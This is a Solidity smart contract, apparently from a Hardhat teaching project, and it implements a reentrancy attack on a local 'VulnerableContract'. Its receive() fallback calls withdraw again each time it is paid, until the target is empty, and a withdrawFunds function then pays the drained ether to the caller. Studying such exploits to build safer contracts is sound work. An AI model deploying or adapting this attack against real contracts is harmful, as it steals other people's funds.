// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;
import "hardhat/console.sol";
import "./VulnerableContract.sol";


contract Attack {
    VulnerableContract public vulnerable;

    constructor(address _vulnerableAddress) {
        vulnerable = VulnerableContract(_vulnerableAddress);
    }

    function attack() external payable {
        vulnerable.deposit{value: msg.value}();
        vulnerable.withdraw();
    }

    receive() external payable {
    console.log("Reentrancy activado. Balance del contrato vulnerable:", address(vulnerable).balance);
    console.log("Ether recibido en Attack.sol:", msg.value, "wei");
    
    if (address(vulnerable).balance > 0) { 
        console.log("Ejecutando otro withdraw...");
        vulnerable.withdraw();
    } else {
        console.log("Ataque finalizado.");
      }
 }
      function withdrawFunds() external {
    payable(msg.sender).transfer(address(this).balance);
}

}



